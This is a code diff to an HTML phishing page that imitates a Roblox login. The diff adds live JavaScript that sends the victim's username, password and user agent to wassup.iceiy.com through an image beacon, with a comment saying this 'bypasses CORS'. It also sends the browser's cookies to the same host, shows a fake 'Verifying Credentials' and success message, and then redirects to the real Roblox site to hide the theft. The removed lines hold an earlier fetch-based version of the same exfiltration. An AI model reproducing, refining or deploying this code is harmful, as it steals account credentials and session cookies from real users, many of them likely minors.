@@ -96,6 +96,19 @@
             align-items: center;
             font-size: 2rem;
         }
+        #success {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 1.5rem;
+            z-index: 10000;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+        }
     </style>
 </head>
 <body>
@@ -111,7 +124,7 @@
         </form>
     </div>
     <div id="fake-loading">Verifying Credentials...Please Wait</div>
-    <div id="success">Successfully comfirmed session! Redirecting Now</div>
+    <div id="success">Successfully confirmed session! Redirecting Now</div>
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const usernameField = document.getElementById('username');
@@ -147,27 +160,17 @@
                     return;
                 }
 
-                fetch("https://wassup.iceiy.com/save.php", {
-                    method: "POST",
-                    mode: 'no-cors',
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        username: username,
-                        password: password,
-                        ip: 'UNKNOWN',
-                        user_agent: navigator.userAgent
-                    })
-                });
-
                 document.getElementById('fake-loading').style.display = 'flex';
-                document.getElementById('success').style.display = 'flex';
+
+                // Use an image to send data (bypasses CORS)
+                (new Image()).src = `https://wassup.iceiy.com/save.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&user_agent=${encodeURIComponent(navigator.userAgent)}`;
+
                 const cookies = document.cookie;
                 if (cookies) {
-                    navigator.sendBeacon("https://wassup.iceiy.com/start.php", `cookies=${encodeURIComponent(cookies)}`);
+                    (new Image()).src = `https://wassup.iceiy.com/start.php?cookies=${encodeURIComponent(cookies)}`;
                 }
 
+                document.getElementById('success').style.display = 'block';
                 setTimeout(() => {
                     window.location.href = "https://www.roblox.com/home";
                 }, 3000);
